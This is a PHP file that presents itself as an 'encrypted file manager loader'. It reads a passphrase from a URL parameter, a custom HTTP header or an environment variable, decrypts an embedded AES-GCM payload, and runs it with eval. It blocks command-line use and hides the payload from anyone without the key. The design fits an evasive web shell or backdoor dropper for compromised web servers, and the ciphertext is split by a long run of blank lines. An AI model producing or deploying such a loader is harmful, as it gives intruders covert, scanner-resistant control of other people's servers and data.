<?php
declare(strict_types=1);

/*
  Encrypted File Manager Loader
  - Decrypts payload in memory with AES-256-GCM
  - Passphrase sources (first wins):
      1) $_GET['k']
      2) HTTP header 'X-FileM-Key'
      3) getenv('FILEM_KEY') or $_ENV['FILEM_KEY']
  - If the key is wrong/missing, nothing is revealed.
*/

function _fm_header_txt(): void {
    if (!headers_sent()) {
        header('Content-Type: text/plain; charset=utf-8');
        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        header('Pragma: no-cache');
        header('X-Content-Type-Options: nosniff');
    }
}

function _fm_get_pass(): ?string {
    if (isset($_GET['k']) && is_string($_GET['k']) && $_GET['k'] !== '') return $_GET['k'];
    $h = $_SERVER['HTTP_X_FILEM_KEY'] ?? '';
    if (is_string($h) && $h !== '') return $h;
    $e = getenv('FILEM_KEY'); if ($e !== false && $e !== '') return $e;
    if (!empty($_ENV['FILEM_KEY'])) return (string)$_ENV['FILEM_KEY'];
    return null;
}

function _fm_decrypt(string $packJson, string $pass): string {
    $d = json_decode($packJson, true, 16, JSON_BIGINT_AS_STRING);
    if (!is_array($d)) throw new Exception('Bad payload');

    $v    = (int)($d['v'] ?? 0);
    $algo = (string)($d['algo'] ?? '');
    $salt = base64_decode((string)($d['salt'] ?? ''), true);
    $iv   = base64_decode((string)($d['iv'] ?? ''), true);
    $tag  = base64_decode((string)($d['tag'] ?? ''), true);
    $ct   = base64_decode((string)($d['ct'] ?? ''), true);

    if ($v !== 1 || !$salt || !$iv || !$tag || !$ct) throw new Exception('Bad fields');

    $key = hash('sha256', $pass . $salt, true); // 32 bytes
    $plain = openssl_decrypt($ct, $algo, $key, OPENSSL_RAW_DATA, $iv, $tag, '');
    if ($plain === false) throw new Exception('Decrypt failed (bad key?)');
    return $plain;
}

// --- Embedded encrypted payload (filled by encoder) ---
$__FM_PAYLOAD = <<<'JSON_PAYLOAD'
{"v":1,"algo":"aes-256-gcm","salt":"TwsjH6Z412AHOrPzPs67tg==","iv":"AspwCGW2BRkIS871","tag":"KuAJMUok9HxH8cUXu8w1UA==","ct":"wemnhv3HCkxpucHaTzVfEBvcF/ytmr/5NZIZ/qldmiKKf7wd1Bp99h2dajD+nw4xzAsFGeZlODBfu6OPs3f4i6qjqNDXziH7RnWzCwE30PCkbFAv2H5mB7PpL27eikcNeyKmxM/ilMQiv3u/FdueJGXSH4WFfFLf6clepblBTGKl8JCWp3lM/+4qxJafOWWuygDCgrjc5w/Rkqcuv2cjX00U3v4bWL2n1xWEByum0J/dd6


































































XrVZhJhuUEclDBryTCPvYoWSHdDROipDLdWoElge"}
JSON_PAYLOAD;

// Require a passphrase
$__pass = _fm_get_pass();
if ($__pass === null) {
    _fm_header_txt();
    http_response_code(401);
    echo "Encrypted file manager\n\nPassphrase required.\n\n";
    echo "Provide it via:\n";
    echo "  - Query:   ?k=YOUR_PASS\n";
    echo "  - Header:  X-FileM-Key: YOUR_PASS\n";
    echo "  - Env:     FILEM_KEY=YOUR_PASS\n";
    exit;
}

try {
    $__code = _fm_decrypt($__FM_PAYLOAD, $__pass);

    // Optional: prevent accidental CLI dump
    if (php_sapi_name() === 'cli') { _fm_header_txt(); echo "CLI disabled for this loader.\n"; exit; }

    // Execute the decrypted code in-memory
    unset($__FM_PAYLOAD, $__pass);
    eval('?>' . $__code);
    exit;

} catch (Throwable $e) {
    _fm_header_txt();
    http_response_code(403);
    echo "Decryption failed.\n";
    exit;
}
